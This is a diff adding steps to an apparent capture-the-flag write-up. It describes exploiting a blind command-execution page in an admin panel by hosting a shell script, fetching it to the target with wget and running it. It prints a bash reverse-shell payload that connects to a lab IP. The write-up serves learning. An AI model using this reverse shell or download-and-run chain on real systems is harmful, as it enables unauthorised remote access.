@@ -99,7 +99,28 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ![image](https://github.com/user-attachments/assets/7413044e-b722-4133-9627-a70c7df9e692)
 
-- Now we have the credentials for the login page,I discovered a page that executes shell commands in the admin page.
+- Now we have the credentials for the login page,I discovered a page that executes shell commands in the admin page.Although,the results of the commands are not displayed.If the commands doesn't trigger any error,we receive the `OK` reply as seen below.
+
+![image](https://github.com/user-attachments/assets/4b7a9c75-fc70-4344-820b-90a13f775b96)
+
+- After testing numerous payloads,I was unable to get a shell,I tried a method that I got from a friend to spawn a shell.This method requires `curl` or `wget`.Luckily,we have both running on the server.I hosted a sh file containing a bash reverse shell payload on an `http` server with python.Then,I downloaded it and ran the shell file on the target machine.Sh file content-:
+
+```bash
+#! /bin/bash
+bash -i >&/dev/tcp/10.9.0.82/80 0>&1
+```
+
+- I ransferred to the victim's machine with wget.
+
+![image](https://github.com/user-attachments/assets/4e328ac9-e0d0-4119-9964-b5ca0419a3f6)
+
+- I changed permissions and executed the reverse shell.
+
+![image](https://github.com/user-attachments/assets/1829e1d0-b7ca-4a5a-b342-0c3754a87d19)
+
+
+
+
 
 
 
